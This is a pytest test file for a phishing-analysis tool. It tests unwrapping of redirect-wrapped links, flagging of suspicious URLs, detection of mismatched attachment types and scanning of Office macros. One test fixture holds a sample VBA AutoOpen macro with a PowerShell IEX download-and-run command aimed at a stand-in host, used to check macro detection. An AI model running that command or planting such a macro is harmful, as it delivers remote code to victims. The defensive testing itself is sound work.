import pytest

from unhook.analysis.attachments import MacroReport, inspect, scan_macros, sniff
from unhook.analysis.message import Attachment, Link
from unhook.analysis.urls import analyze_links, analyze_url, unwrap


def info(href, text=""):
    return analyze_url(Link(href, text))


# --- URLs ------------------------------------------------------------------

def test_safelinks_wrapper_is_removed():
    wrapped = "https://nam02.safelinks.protection.outlook.com/?url=https%3A%2F%2Fevil.example%2Fa%3Fb%3D1&data=05"
    assert unwrap(wrapped) == "https://evil.example/a?b=1"


def test_proofpoint_v2_wrapper_is_decoded():
    wrapped = "https://urldefense.proofpoint.com/v2/url?u=http-3A__example.com_path-2Dwith-2Ddashes&d=Dw"
    assert unwrap(wrapped) == "http://example.com/path-with-dashes"


def test_proofpoint_v3_wrapper_is_decoded():
    assert unwrap("https://urldefense.com/v3/__https://evil.example/x__;!!abc$") == "https://evil.example/x"


def test_google_redirect_wrapper_is_removed():
    assert unwrap("https://www.google.com/url?q=https://evil.example/&sa=D") == "https://evil.example/"


def test_wrappers_nest():
    inner = "https://evil.example/"
    once = f"https://www.google.com/url?q={inner}"
    twice = f"https://nam02.safelinks.protection.outlook.com/?url={once}"
    assert unwrap(twice) == inner


def test_analysis_reports_the_destination_not_the_wrapper():
    u = info("https://urldefense.proofpoint.com/v2/url?u=https-3A__evil.example_x&d=Dw")
    assert u.host == "evil.example" and u.wrapped_from


@pytest.mark.parametrize("href,flag", [
    ("http://203.0.113.5/a", "ip_host"),
    ("https://xn--bcher-kva.example/", "punycode"),
    ("https://paypal.com@evil.example/", "userinfo"),
    ("https://bit.ly/abc", "shortener"),
    ("https://a.b.c.d.evil.example/", "deep_subdomains"),
    ("http://evil.example/", "no_tls"),
    ("https://evil.example:8443/", "odd_port"),
    ("https://thing.zip/", "risky_tld"),
    ("https://abc.pages.dev/", "free_hosting"),
    ("https://evil.example/" + "a" * 260, "very_long"),
])
def test_url_flags(href, flag):
    assert flag in info(href).flags


def test_clean_url_has_no_flags():
    assert info("https://www.example.org/about").flags == []


def test_mailto_tel_and_fragments_are_ignored():
    assert analyze_url(Link("mailto:a@b.example")) is None
    assert analyze_url(Link("tel:+15551234")) is None
    assert analyze_url(Link("#top")) is None


def test_script_schemes_are_kept_as_flagged_entries():
    assert info("javascript:alert(1)").flags == ["javascript_scheme"]


def test_text_mismatch_needs_a_real_domain_in_the_text():
    assert "text_mismatch" in info("https://evil.example/", "https://www.mybank.com/login").flags
    assert "text_mismatch" not in info("https://evil.example/", "Open the shared budget.xlsx").flags
    assert "text_mismatch" not in info("https://evil.example/", "Click here").flags
    assert "text_mismatch" not in info("https://mybank.com/login", "www.mybank.com").flags


def test_email_service_tracking_links_do_not_count_as_mismatches():
    assert "text_mismatch" not in info("https://u1.ct.sendgrid.net/ls/click?x=1", "https://www.ourschool.org/news").flags


def test_duplicates_collapse_and_keep_the_anchor_text():
    urls = analyze_links([Link("https://evil.example/a", "", "text"), Link("https://evil.example/a", "https://mybank.com", "html")])
    assert len(urls) == 1 and "text_mismatch" in urls[0].flags


# --- attachments -------------------------------------------------------------

def att(name, data, mime="application/octet-stream"):
    return inspect(Attachment(name, mime, data))


def test_sniffing_ignores_the_extension():
    assert sniff(b"MZ\x90\x00") == "pe"
    assert sniff(b"%PDF-1.4") == "pdf"
    assert sniff(b"{\\rtf1") == "rtf"
    assert sniff(b"<html><body>x") == "html"
    assert sniff(b"plain words") == "text"


def test_rtf_named_doc_is_a_type_mismatch():
    assert "type_mismatch" in att("invoice.doc", b"{\\rtf1\\ansi stuff").flags


def test_ole_named_doc_is_fine_and_tries_macro_scan():
    report = att("legacy.doc", bytes.fromhex("D0CF11E0A1B11AE1") + b"\x00" * 128)
    assert "type_mismatch" not in report.flags


def test_text_named_txt_is_fine():
    assert att("notes.txt", b"just notes").flags == []


def test_html_named_txt_is_not_flagged_as_executable():
    flags = att("notes.txt", b"<html>hello</html>").flags
    assert "disguised_executable" not in flags


def test_olevba_finds_autoexec_and_iocs_in_vba_source():
    vba = (b'Attribute VB_Name = "Module1"\nSub AutoOpen()\n    Dim s As String\n'
           b'    s = "powershell -nop -c IEX(New-Object Net.WebClient).DownloadString(\'http://payload.example/a\')"\n'
           b'    Shell s, 0\nEnd Sub\n')
    report = scan_macros(vba, "macro.bas")
    assert isinstance(report, MacroReport) and report.present
    assert "AutoOpen" in report.autoexec
    assert any("Shell" in s for s in report.suspicious)
    assert any("payload.example" in i for i in report.iocs)


def test_scan_macros_returns_none_for_things_oletools_cannot_open():
    assert scan_macros(b"\x00\x01\x02 not an office file", "x.doc") in (None, MacroReport(present=False))
